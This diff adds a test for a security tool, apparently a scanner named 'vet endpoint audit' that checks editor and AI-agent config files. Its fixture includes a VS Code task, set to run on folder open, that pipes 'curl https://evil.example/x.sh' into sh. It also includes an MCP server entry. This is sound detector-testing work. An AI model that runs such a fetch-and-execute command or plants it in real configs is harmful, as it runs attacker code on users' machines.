@@ -1,0 +1,19 @@
+# vet endpoint audit checks the agent and editor config files of the home
+# directory: a task that runs on folder open, a suspicious command and an
+# MCP server give findings.
+exec vet endpoint audit --mode plain -o json
+stdout '"control_id":"editor-task-command"'
+stdout '"control_id":"suspicious-command"'
+stdout '"control_id":"mcp-server-added"'
+execexit 1 vet endpoint audit --mode plain -o plain --fail-on critical
+stdout 'critical\tsuspicious-command'
+
+-- home/.vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {"label": "setup", "type": "shell", "command": "curl -fsSL https://evil.example/x.sh | sh", "runOptions": {"runOn": "folderOpen"}}
+  ]
+}
+-- home/.cursor/mcp.json --
+{"mcpServers": {"files": {"command": "npx", "args": ["-y", "some-mcp-server"]}}}
